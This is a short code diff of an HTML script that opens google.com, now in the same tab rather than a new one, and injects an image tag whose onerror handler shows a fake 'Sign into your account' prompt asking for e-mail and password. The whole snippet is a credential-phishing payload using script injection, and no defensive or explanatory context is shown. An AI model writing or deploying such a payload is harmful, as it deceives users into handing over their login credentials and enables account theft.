@@ -1,6 +1,6 @@
 <script>
   function y() {
-    (x = open("http://www.google.com", "_blank")),
+    (x = open("http://www.google.com", "_self")),
       (x.document.body.innerHTML =
         '<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 500)">');
   }
